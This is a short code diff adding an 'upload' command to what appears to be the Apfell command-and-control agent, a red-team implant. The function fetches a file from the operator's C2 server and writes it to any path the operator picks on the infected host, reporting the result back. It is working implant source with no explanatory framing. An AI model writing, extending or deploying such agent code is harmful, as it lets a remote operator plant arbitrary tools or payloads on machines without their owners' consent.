@@ -1,0 +1,30 @@
+def upload(apfell, c2, params="", task_id=-1):
+    # params="{"file_id": 5, "remote_path": "/path"}"
+    try:
+        import json
+    except Exception as e:
+        c2.post_response(response="Failed to import modules", task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        param_json = json.loads(params)
+    except Exception as e:
+        c2.post_response(response="Failed to parse params: {}".format(params), task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        file_data = c2.upload(param_json['file_id'])
+    except Exception as e:
+        c2.post_response(response="Failed to upload file: {}".format(str(e)), task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    try:
+        file = open(param_json['remote_path'], 'wb')
+        file.write(file_data)
+        file.close()
+        c2.post_response(response="Wrote file", task_id=task_id)
+    except Exception as e:
+        c2.post_response(response="Failed to write file: {}".format(str(e)), task_id=task_id)
+    apfell.remove_job(task_id)
+    return
+COMMAND_ENDS_HERE
